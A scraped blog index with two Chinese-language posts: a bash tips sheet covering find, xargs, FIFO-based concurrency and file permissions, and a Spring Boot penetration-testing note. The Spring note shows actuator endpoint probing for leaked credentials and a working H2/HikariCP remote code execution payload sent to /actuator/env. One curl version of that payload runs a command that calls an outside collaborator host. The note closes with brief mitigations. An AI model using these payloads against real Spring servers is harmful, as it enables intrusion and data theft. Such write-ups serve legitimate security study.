1 2 3 4 5   color 黑 红 绿 黄 蓝 洋红    1 2 3 4  RED=$(tput setaf 1) GREEN=$(tput setaf 2) RESET=$(tput sgr0) # sgr0 表示颜色重置 echo \u0026#34;${RED}red text ${GREEN}green text${RESET}\u0026#34;   bash注释 单行注释 # 1 2 3  # 单行注释符 : commnets here   多行注释  方式一  1 2 3 4 5  \u0026lt;\u0026lt; COMMENT comment here .... comment here COMMENT   方式二  1 2 3 4 5  :\u0026#39; commnet here ... commnet here \u0026#39;   后台运行 1  \u0026lt;command\u0026gt; # 按下ctrl-z即可挂起该进程    fg : 在前台恢复执行当前作业 bg : 在后台恢复执行当前作业  切换目录cd -  - 表示上一个目录  开发规范 1 2 3 4 5 6  # Date: 2020-8-8 8:8:8 # Author: askDing # Blog: https://askding.github.io # # Version: 1.1 # Description:    分割/合并文件  分割文件  1 2 3 4 5 6 7 8 9  cut -f \u0026lt;col_list\u0026gt; -d \u0026#39;;\u0026#39; --complenment --output-delimiter \u0026#39;-\u0026#39; file # 按列切分文件 -f 指定待提取的列号 # -d 指定分隔符 # --complenment 输出-f指定之外的所有列 # --output-delimiter 指定输出分隔符 split [-b size] [-d [-a \u0026lt;num\u0026gt;]] file # -b指定分割文件的大小10k、10M、10G、 # -d 以数字为后缀 # -a num 指定后缀的长度    合并文件  1 2  cat file1 file2 ... \u0026gt; file_total # 按行合并文件 paste file1 file2 ... -d \u0026#39;,\u0026#39; # 按列合并文件,-d指定分隔符   cat的特殊用法 1  echo \u0026#34;aa bb cc\u0026#34; | cat - other_file # - 作为stdin文本的文件名   终端截图 1 2 3  xwd -root -out /tmp/xwd_test.xwd # 截取整个屏幕,不需要鼠标选择区域 xwud -in /tmp/xwd_test.xwd # 查看截屏文件 convert /tmp/xwd_test.xwd /tmp/xwd_test.png # 转换成png格式图片   script录制终端会话 1 2 3  script -t 2\u0026gt; rec.time -a rec.his # 开始录制 -t 记录时序 -a 追加输出到文件, -a可忽略 exit # 结束录制 scriptreplay -t rec.time -s rec.his # 回放 -t -s可省略   termtosvg生成svg动画 termtosvg\n1 2 3  brew install termtosvg termtosvg exit   find命令技巧 1 2 3 4 5 6  find . -type f -name \u0026#34;*.a\u0026#34; -print0 -exec rm {} \\; find . \\(-path \u0026#34;./code\u0026#34; -o -path \u0026#34;./code2\u0026#34; \\) -prune -o -name \u0026#34;*.txt\u0026#34; -print //在当前目录及除code和code2之外的子目录中查找txt文件 # 可用于删除-开头的文件,  # -print0 使用0(NULL)字符分割查找到的元素 # {}代表find出的文件名  # \\; 对;进行转义,代表rm命令的结束   xargs命令技巧 一般情况下可使用``来执行命令，然后将其输出作为命令行参数，达到使用只能接收命令行参数的命令,\n但需要处理的文件过多,会出现\u0026quot;Argument list too long\u0026quot;的错误。可使用xargs来解决\n1 2 3 4 5 6  \u0026lt;command1\u0026gt; | xargs [-n] [-d \u0026#39;X\u0026#39;] [-I {}] [command2 -p {} -l] # -n 限制每行输出n个元素, 输出m行,command2命令执行m次  # -d \u0026#39;X\u0026#39; 以X作为分隔符分割command1输出的内容 # -I {} 以{}位置作为xargs传递给command 的参数位置 # 使用-I时,command2以循环的方式执行。如果m=3，command2连同{}一起执行3次,{}会在每次执行中被替换为相应的参数   xargs 紧跟在管道操作符|之后, 默认使用执行/bin/echo。\n将数据以空格或换行符分隔成单个元素，然后调用指定命令并将这些元素作为该命令的参数, 类似于find -exec\n1 2 3  cat target.txt | xargs # 多行输入转单行输出 cat args.txt | xargs -I {} ./aa.sh -p {} -l # -I {} 指定aa.sh命令执行时替换字符串的位置标识 find /smbMount -iname \u0026#34;*.docx\u0026#34; -print0 | xargs -0 grep \u0026#34;askDing\u0026#34; # -iname 忽略大小写, -print0 -0都是以0作为分隔符    并发执行()\u0026amp;/{}\u0026amp; 主要方法是使用 \u0026amp; 符号，将命令fork到后台执行,然后配合wait等待进程结束\n1 2 3 4 5 6 7 8 9 10  for ip in 192.168.8.{1..255}; do ( ping $ip -c2 \u0026amp;\u0026gt; /dev/null if [ $? -eq 0 ]; then echo $ip is alive fi )\u0026amp; done wait   利用管道和文件描述符FD_id实现并发数控制  FD关联命令管道,具有管道特性，并且可以 无限存不阻塞，无限取不阻塞，而不用关心管道内是否为空，也不用关心是否有内容写入 命名管道控制并发数 操作FD   创建一个管道并用指定FD_ID打开 mkfifo /tmp/$$.fifo; exec 3\u0026lt;\u0026gt;/tmp/$$.fifo 以当前进程PID创建fifo文件，防止冲突 循环向FD_ID(关联到管道)输入任意字符(建议echo输入空白字符\\n) \u0026gt;创建进程数 在循环体中，通过read -u \u0026lt;文件描述符\u0026gt; 读取管道中的数据，执行命令，然后echo \u0026gt;\u0026amp;FD_ID,补充进程数 \u0026gt;执行程序 全部任务完成后，exec FD_ID\u0026lt;\u0026amp;- \u0026amp;\u0026amp; exec FD_ID\u0026gt;\u0026amp;- 关闭管道  mkfifo介绍 管道具有存一个读一个，读完一个就少一个，没有则阻塞，放回的可以重复取，这正是队列特性\n1 2 3 4  [ -e /tmp/$$.fifo ] || mkfifo /tmp/$$.fifo # 创建命名管道 exec 3\u0026lt;\u0026gt; /tmp/$$.fifo # 将FD关联到管道 rm -rf /tmp/$$.fifo # 删除管道文件，FD具有管道的一切特性，可通过FD来操作 echo \u0026gt;\u0026amp;8 # 向FD内输入`\\n`   exec命令、操作文件描述符  exec操作命令或脚本时：   exec xx.sh : xx.sh会替换当前进程, 执行xx.sh，就不会再返回调用exec的程序。  exec操作文件描述符时：   exec 3\u0026lt;/tmp/1.txt 以只读方式打开/tmp/1.txt文件，文件描述符为3 exec 3\u0026gt;/tmp/1.txt 以只写方式打开/tmp/1.txt文件，文件描述符为3 exec 3\u0026lt;\u0026gt;/tmp/1.txt 以读写方式打开/tmp/1.txt文件，文件描述符为3 exec 3\u0026lt;\u0026amp;- 关闭文件描述符3的读 exec 3\u0026gt;\u0026amp;- 关闭文件描述符的写  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  #!/bin/bash  thread=10 # 定义进程数 start_time=`date +%s` [ -e /tmp/$$.fifo ] || mkfifo /tmp/$$.fifo # 创建命名管道文件 exec 3\u0026lt;\u0026gt; /tmp/$$fifo # 创建FD 3，以可读（\u0026lt;）可写（\u0026gt;）的方式关联管道文件，FD 3具有命名管道的特性 rm -rf /tmp/$$fifo # 删除命名管道文件，通过FD 3 for i in $(seq $thread); do echo \u0026gt;\u0026amp;3 # 循环$thread次向FD 3写入\\n , 类比一个令牌  done for i in $(seq 1000); do read -u 3 # 循环读取FD 3中取\\n , 直到读取位置 { # 需要并行执行的命令放在此处 sleep 1 \u0026amp;\u0026amp; echo \u0026#34;$iDone\u0026#34; # 最后需要归还令牌 echo \u0026gt;\u0026amp;3 # 再次向FD 3写入\\n , 类似归还令牌 }\u0026amp; # 并发执行标志{}\u0026amp;，fork放在后台执行 done wait # 等待并发进程执行完毕，执行后续命令  stop_time=`date +%s` echo \u0026#34;TIME: `expr $stop_time-$start_time`\u0026#34; exec 3\u0026lt;\u0026amp;- # 关闭FD 3的读 exec 3\u0026gt;\u0026amp;- # 关闭FD 3的写   监视命令输出 1  watch [-d] [-n \u0026lt;num\u0026gt;] command # 每隔num秒更新一次command命令的输出, -d 标记输出差异   特殊文件权限 S t/T 权限模式\n   文件类型 所有者 所属组 其他用户     -/b/c/d/l/p/s r w x r w x r w x    特殊权限均出现在执行权限(x)的位置\n setuid权限 允许其他用户执行此(ELF格式的二进制)文件会以文件拥有者的权限来运行 -rwS------  1  chmod u+s executeable_file    setgid权限 其他用户运行此文件时具有所属组权限----rwS---  1  chmod g+s directory_name/executeable_file #一般设置目录 ,该目录下的文件集成该目录的属性    目录sticky bit 针对其他用户设置的,只有目录/文件所有者和root才能删除的文件-------rwt或---------T 如/tmp目录  t 表示目录内文件有可执行权限 T 表示目录内文件无可执行权限    1  chmod o+t \u0026lt;directory_name\u0026gt;   正则表达式可视化工具 Regexpr\n\n对别名进行转义 在不可信环境下执行特权命令时，在命令前加上\\忽略可能存在的别名\n","description":"","id":131,"section":"en","tags":null,"title":"bash_basic","uri":"http://crkmythical.github.io/en/blog/bash-basic/"},{"content":"编写进度\n   推荐资料：\n  SpringBootVulExploit\n  Spring 框架漏洞集合\n  Spring Boot Actuator H2 RCE复现\n  Spring Boot Actuator(eureka xstream deserialization RCE)\n  Spring 是为解决企业应用开发的复杂性而创建的一个开源框架。\n主要的设计思想是有两个：\n 控制反转IOC\nIOC是一种设计思想，将原本在程序中自己手动创建对象的控制权，交由 Spring 框架来管理。 面向方面编程AOP\n利用一种称为\u0026quot;横切\u0026quot;的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为\u0026quot;Aspect\u0026quot;，即切面。  信息收集 1 2 3 4 5 6 7  nmap -Pn -T4 -p 8080 -sV --version-all 192.168.79.28 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 17:18 CST Nmap scan report for 192.168.79.28 Host is up (0.00019s latency). PORT STATE SERVICE VERSION 8080/tcp open http-proxy   访问不存在的页面包含以下信息证明使用了Spring Boot\n1 2 3 4 5 6  Whitelabel Error Page This application has no explicit mapping for /error, so you are seeing this as a fallback. Tue Dec 15 09:35:57 GMT 2020 There was an unexpected error (type=Not Found, status=404). No message available   Spring API信息获取\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  curl -v \u0026#39;http://192.168.79.28:8080/trace\u0026#39; # 获取用户认证字段 curl -v \u0026#39;http://192.168.79.28:8080/env\u0026#39; # 服务器配置信息，包括数据库 curl -v \u0026#39;http://192.168.79.28:8080/health\u0026#39; # 泄漏git项目地址 curl -v \u0026#39;http://192.168.79.28:8080/heapdump\u0026#39; # 泄漏后台用户信息 curl -v \u0026#39;http://192.168.79.28:8080/\u0026#39; curl -v \u0026#39;http://192.168.79.28:8080/\u0026#39; curl -v \u0026#39;http://192.168.79.28:8080/\u0026#39; curl -v \u0026#39;http://192.168.79.28:8080/\u0026#39; ## Spring Boot Actuator H2 with HikariCP远程代码执行 **Actuator** 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。 Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的 更多[Spring Boot Rest API](https://howtodoinjava.com/spring-boot2/rest/rest-api-example/) ```zsh curl \u0026#39;http://192.168.79.28:8080/actuator\u0026#39; # 查看actuator下的端点actuator/env {\u0026#34;_links\u0026#34;:{\u0026#34;self\u0026#34;:{\u0026#34;href\u0026#34;:\u0026#34;http://192.168.79.28:8080/actuator\u0026#34;,\u0026#34;templated\u0026#34;:false},\u0026#34;env-toMatch\u0026#34;:{\u0026#34;href\u0026#34;:\u0026#34;http://192.168.79.28:8080/actuator/env/{toMatch}\u0026#34;,\u0026#34;templated\u0026#34;:true},\u0026#34;env\u0026#34;:{\u0026#34;href\u0026#34;:\u0026#34;http://192.168.79.28:8080/actuator/env\u0026#34;,\u0026#34;templated\u0026#34;:false},\u0026#34;restart\u0026#34;:{\u0026#34;href\u0026#34;:\u0026#34;http://192.168.79.28:8080/actuator/restart\u0026#34;,\u0026#34;templated\u0026#34;:false}}}%   发送EXP\n1 2 3 4 5 6 7 8 9 10 11 12 13  POST /actuator/env HTTP/1.1 content-type: application/json {\u0026#34;name\u0026#34;:\u0026#34;spring.datasource.hikari.connection-test-query\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;CREATE ALIAS EXEC AS \u0026#39;String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}\u0026#39;; CALL EXEC(\u0026#39;/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#39;);\u0026#34;} POST /actuator/restart HTTP/1.1 content-type: application/json {}   1 2 3 4  curl -X \u0026#39;POST\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; --data-binary $\u0026#39;{\\\u0026#34;name\\\u0026#34;:\\\u0026#34;spring.datasource.hikari.connection-test-query\\\u0026#34;,\\\u0026#34;value\\\u0026#34;:\\\u0026#34;CREATE ALIAS EXEC AS CONCAT(\\\u0026#39;String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\\\u0026#39;,\\\u0026#39; java.util.Scanner(Runtime.getRun\\\u0026#39;,\\\u0026#39;time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\\\u0026#39;);CALL EXEC(\\\u0026#39;curl http://x.burpcollaborator.net\\\u0026#39;);\\\u0026#34;}\u0026#39; \u0026#39;http://192.168.79.28:8080/actuator/env\u0026#39; #发送exp curl -X \u0026#39;POST\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; \u0026#39;http://192.168.79.28:8080/actuator/restart\u0026#39; # 触发exp   安全措施  引入 security 依赖，打开安全限制并进行身份验证 设置单独的 Actuator 管理端口并配置不对外网开放  ","description":"","id":132,"section":"en","tags":null,"title":"Spring","uri":"http://crkmythical.github.io/en/blog/spring/"}]